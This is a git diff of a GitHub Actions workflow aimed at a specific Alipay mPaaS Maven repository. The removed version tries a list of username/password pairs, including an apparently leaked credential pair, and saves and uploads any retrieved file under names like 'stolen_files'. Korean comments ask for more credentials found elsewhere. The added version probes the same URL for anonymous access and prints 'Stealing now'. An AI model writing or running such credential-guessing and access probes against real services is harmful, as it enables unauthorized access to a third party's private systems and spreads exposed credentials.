@@ -1,60 +1,31 @@
-name: Android Credential Tester
+name: Android SDK Final Probe
 
 on: 
   workflow_dispatch:
 
 jobs:
-  test_keys:
+  probe:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-
       - name: Set up Python
         uses: actions/setup-python@v4
         with:
           python-version: '3.10'
-
       - name: Install requests
         run: pip install requests
-
-      - name: Brute-Force Credentials
+      - name: Anonymous Access Test
         shell: python
         run: |
           import requests
-          from requests.auth import HTTPBasicAuth
-          import os
-
-          # [수사 포인트] 알고 있는 ID/PW 후보군을 여기에 모두 넣으세요.
-          credentials = [
-              ("mvn_read_ws", "mrk8929"),    # 기존 공용
-              ("public", "public"),          # 일반적인 공용
-              # ("ID", "PW"),                # 연구실에서 찾은 다른 정보가 있다면 추가
-          ]
-
-          test_url = "https://mvn.cloud.alipay.com/nexus/content/repositories/releases/com/mpaas/android/mpaas-baseline/10.2.3-1850000/mpaas-baseline-10.2.3-1850000.pom"
+          url = "https://mvn.cloud.alipay.com/nexus/content/repositories/releases/com/mpaas/android/mpaas-baseline/10.2.3-1850000/mpaas-baseline-10.2.3-1850000.pom"
           
-          found_key = False
-          for username, password in credentials:
-              print(f"[*] Testing: {username} / {password} ...")
-              r = requests.get(test_url, auth=HTTPBasicAuth(username, password))
-              
-              if r.status_code == 200:
-                  print(f"[+++] SUCCESS! Valid Key Found: {username} / {password}")
-                  os.makedirs("stolen_files", exist_ok=True)
-                  with open("stolen_files/master.pom", "w") as f: f.write(r.text)
-                  found_key = True
-                  break
-              else:
-                  print(f"    [-] Failed (Status: {r.status_code})")
-
-          if not found_key:
-              print("[X] All keys failed. Need new credentials.")
+          print(f"[*] Testing Anonymous Access on: {url}")
+          # auth 매개변수를 완전히 제거하고 요청합니다.
+          r = requests.get(url, timeout=15)
+          
+          print(f"[!] Result: Status {r.status_code}")
+          if r.status_code == 200:
+              print("[+++] AMAZING! Anonymous access is allowed. Stealing now...")
+          else:
+              print("[X] Access Denied. The vault is truly locked.")
               exit(1)
-
-      - name: Upload
-        if: always()
-        uses: actions/upload-artifact@v4
-        with:
-          name: mPaaS_Stolen_BOM
-          path: stolen_files/
